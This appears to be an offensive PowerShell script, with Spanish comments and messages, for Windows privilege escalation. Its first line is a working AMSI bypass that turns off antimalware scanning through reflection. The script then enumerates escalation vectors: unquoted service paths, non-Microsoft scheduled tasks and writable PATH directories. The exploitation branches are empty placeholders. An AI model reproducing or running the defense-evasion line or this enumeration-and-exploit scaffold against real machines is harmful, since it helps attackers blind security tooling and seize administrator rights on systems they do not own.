[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

function CheckAdmin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
    $isAdmin = ([Security.Principal.WindowsPrincipal] $currentUser).IsInRole($adminRole)
    return $isAdmin
}

if (CheckAdmin) {
    Write-Host "[+] Ya tienes privilegios de administrador!" -ForegroundColor Green
    exit
}

function Find-AllVulns {
    try {
        $vectors = @()

        # Servicios con permisos débiles
        $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike "`"*`"" }
        foreach ($service in $services) {
            $vectors += [PSCustomObject]@{
                Name = "Service_$($service.Name)"
                VulnName = "Servicio con espacios sin comillas"
                Description = "El servicio $($service.Name) tiene espacios en la ruta sin comillas"
            }
        }

        # Tareas programadas con permisos débiles
        $tasks = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }
        foreach ($task in $tasks) {
            $vectors += [PSCustomObject]@{
                Name = "Task_$($task.TaskName)"
                VulnName = "Tarea programada modificable"
                Description = "La tarea $($task.TaskName) puede ser modificada"
            }
        }

        # Binarios PATH con permisos de escritura
        $paths = $env:PATH -split ';'
        foreach ($p in $paths) {
            if (Test-Path $p) {
                $acl = Get-Acl $p
                if ($acl.Access | Where-Object { $_.IdentityReference -eq "$env:USERDOMAIN\$env:USERNAME" -and $_.FileSystemRights -match "Write" }) {
                    $vectors += [PSCustomObject]@{
                        Name = "PATH_$p"
                        VulnName = "Directorio PATH con escritura"
                        Description = "El directorio $p tiene permisos de escritura"
                    }
                }
            }
        }

        return $vectors
    } catch {
        Write-Host "[!] Error en Find-AllVulns: $($_.Exception.Message)" -ForegroundColor Red
        return @()
    }
}

Write-Host "[+] Ejecutando checks de escalada de privilegios..." -ForegroundColor Yellow

$vulnerabilities = Find-AllVulns

if ($vulnerabilities.Count -eq 0) {
    Write-Host "[-] No se encontraron vectores de escalada obvious." -ForegroundColor Red
    exit
}

Write-Host "[+] Intentando metodos de escalada..." -ForegroundColor Yellow

foreach ($vector in $vulnerabilities) {
    try {
        if ($vector.Name.StartsWith("Service_")) {
            $serviceName = $vector.Name.Replace("Service_", "")
            Write-Host "[+] Intentando explotar: $($vector.VulnName)" -ForegroundColor Yellow
            
            # Intento de explotación de servicio (ejemplo genérico)
            $serviceInfo = Get-WmiObject -Class Win32_Service -Filter "Name='$serviceName'"
            if ($serviceInfo) {
                Write-Host "[+] Servicio encontrado: $serviceName" -ForegroundColor Green
                # Aquí iría la lógica de explotación específica
            }
        }
        elseif ($vector.Name.StartsWith("Task_")) {
            # Lógica para tareas programadas
        }
        elseif ($vector.Name.StartsWith("PATH_")) {
            # Lógica para PATH hijacking
        }

        # Si se obtienen privilegios de admin, salir
        if (CheckAdmin) {
            Write-Host "[+] ¡Exito! Obtenidos privilegios de administrador." -ForegroundColor Green
            break
        }
    } catch {
        Write-Host "[!] Error con $($vector.Name): $($_.Exception.Message)" -ForegroundColor Red
    }
}

if (-not (CheckAdmin)) {
    Write-Host "[-] No se pudieron escalar privilegios." -ForegroundColor Red
    Write-Host "[+] Probando metodos alternativos..." -ForegroundColor Yellow
    # Métodos alternativos aquí
}
